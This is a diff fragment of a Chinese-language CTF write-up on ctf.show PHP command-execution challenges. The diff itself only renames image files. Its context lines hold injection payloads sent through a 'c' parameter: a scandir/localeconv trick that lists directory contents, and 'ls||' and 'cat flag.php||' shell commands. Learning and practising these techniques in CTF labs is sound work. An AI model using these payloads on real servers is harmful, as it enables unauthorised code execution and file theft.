@@ -640,7 +640,7 @@ if(isset($_GET['c'])){
 http://5a6291ec-129d-4e7f-b30b-7776441151ff.challenge.ctf.show/?c=print_r(scandir(pos(localeconv())));
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 可以看到我们要访问倒数第二个文件，所以我们接下来的代码是
 
@@ -685,7 +685,7 @@ if(isset($_GET['c'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 要理解这段代码之前需要先了解一个I/O流的一个写法
 
@@ -699,7 +699,7 @@ if(isset($_GET['c'])){
 http://e8adf119-3cce-41b7-a680-58eefc789d4d.challenge.ctf.show/?c=ls||
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```php
 http://e8adf119-3cce-41b7-a680-58eefc789d4d.challenge.ctf.show/?c=cat flag.php||
